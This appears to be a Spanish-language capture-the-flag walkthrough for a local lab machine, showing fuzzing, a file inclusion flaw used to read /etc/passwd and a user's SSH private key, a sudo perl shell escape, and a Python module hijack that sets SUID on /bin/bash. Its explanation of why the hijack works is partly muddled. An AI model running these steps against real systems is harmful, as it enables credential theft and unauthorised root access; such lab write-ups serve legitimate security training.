## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un posible usuario y nada más. Pruebo con fuzzing a ver que encuentro:

```bash
gobuster dir -u http://172.17.0.2/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Solo esta el “index.php”. Pero como siempre es HTML, pruebo un fuzzing:

```bash
ffuf -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -w <WORDLIST> -fs 2596
```

Encuentro el parámetro “**secret**” y listo usuarios:

```bash
http://172.17.0.2/index.php?secret=/etc/passwd
```

Funciona y encuentro los usuarios vaxei y luisillo.

Pruebo a ver si alguno tiene id_rsa:

```bash
http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa
```

La tiene.

Creo una archivo llamado id_rsa

```bash
chmod 600 id_rsa
ssh -i id_rsa vaxei@172.17.0.2
```

## Escalada vaxei → luisillo

```bash
sudo -l 
(luisillo) NOPASSWD: /usr/bin/perl
```

Encuentro en Gtfo bins:

```bash
sudo -u luisillo perl -e 'exec "/bin/bash";'
```

## Escalada luisillo → root

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

Al ejecutar ese script da un error en la siguiente ruta:

```bash
/usr/lib/python3.12/subprocess.py
```

Ya que no admite algún carácter en el que esta en el script, en concreto en esta parte de aquí:

```python
def run_command():
    subprocess.run(['echo Hello!'], check=True)
```

Toca cambiar el path para que se ejecute nuestro script [**subprocess.py](http://subprocess.py)** antes del ya asignado, ya que esta utilizando una ruta absoluta en el script para importar el modulo.

Creo en el directorio **/opt** el script subprocess.py:

```python
import os

os.system('chmod u+s /bin/bash')
```

Cambio el PATH:

```bash
export PATH=/opt:$PATH
```

Y lo vuelvo a ejecutar:

```bash
sudo python3 /opt/paw.py
```

La bash debería ya tener privilegios.

```bash
bash -p
```

Listo.
